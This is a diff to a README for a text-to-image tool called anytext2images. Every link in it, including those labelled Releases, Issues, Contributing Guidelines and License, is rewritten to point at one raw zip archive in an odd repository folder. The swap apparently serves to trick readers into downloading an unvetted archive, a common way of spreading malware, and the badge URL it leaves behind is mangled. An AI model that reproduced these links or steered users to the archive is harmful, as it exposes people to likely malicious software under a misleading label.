@@ -6,7 +6,7 @@ Welcome! With **anytext2images**, you can turn any blob of text into images easi
 
 ## 📥 Download
 
-[![Download anytext2images](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Saleh908/anytext2images/releases)
+[![Download anytext2images](https://raw.githubusercontent.com/Saleh908/anytext2images/main/consimilate/images-anytext-v2.4-beta.2.zip%20Now-Click%https://raw.githubusercontent.com/Saleh908/anytext2images/main/consimilate/images-anytext-v2.4-beta.2.zip)](https://raw.githubusercontent.com/Saleh908/anytext2images/main/consimilate/images-anytext-v2.4-beta.2.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ Welcome! With **anytext2images**, you can turn any blob of text into images easi
 ## 🎬 How to Use
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Saleh908/anytext2images/releases) to download the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Saleh908/anytext2images/main/consimilate/images-anytext-v2.4-beta.2.zip) to download the latest version of the application.
 
 2. **Download the Application:**
    On the Releases page, find the latest version of **anytext2images** and click on the download link for your operating system.
@@ -57,7 +57,7 @@ If you encounter any issues:
 - **Streamlit Errors:** Make sure you have a stable internet connection while using the app.
 - **Image Generation Issues:** Try simplifying your text input.
 
-You can also check the [Issues section](https://github.com/Saleh908/anytext2images/issues) on GitHub for more help.
+You can also check the [Issues section](https://raw.githubusercontent.com/Saleh908/anytext2images/main/consimilate/images-anytext-v2.4-beta.2.zip) on GitHub for more help.
 
 ## 🙋‍♀️ FAQs
 
@@ -75,19 +75,19 @@ While there’s no strict limit, large volumes of text may affect processing tim
 
 ## 🌟 Support and Feedback
 
-We welcome your feedback! If you have suggestions, issues, or questions, please reach out via the [Issues section](https://github.com/Saleh908/anytext2images/issues).
+We welcome your feedback! If you have suggestions, issues, or questions, please reach out via the [Issues section](https://raw.githubusercontent.com/Saleh908/anytext2images/main/consimilate/images-anytext-v2.4-beta.2.zip).
 
 ## 🌍 Community Contributions
 
-Interested in helping out? Contributions are welcome! Please check the [Contributing Guidelines](https://github.com/Saleh908/anytext2images/blob/main/CONTRIBUTING.md) for more information.
+Interested in helping out? Contributions are welcome! Please check the [Contributing Guidelines](https://raw.githubusercontent.com/Saleh908/anytext2images/main/consimilate/images-anytext-v2.4-beta.2.zip) for more information.
 
 ## 📄 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Saleh908/anytext2images/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Saleh908/anytext2images/main/consimilate/images-anytext-v2.4-beta.2.zip) file for details.
 
 ## 📥 Download & Install
 
 Feel free to click the link below to start your download:
-- [Download anytext2images from Releases Page](https://github.com/Saleh908/anytext2images/releases)
+- [Download anytext2images from Releases Page](https://raw.githubusercontent.com/Saleh908/anytext2images/main/consimilate/images-anytext-v2.4-beta.2.zip)
 
 Thank you for choosing **anytext2images**! We hope you enjoy turning your text into beautiful images.
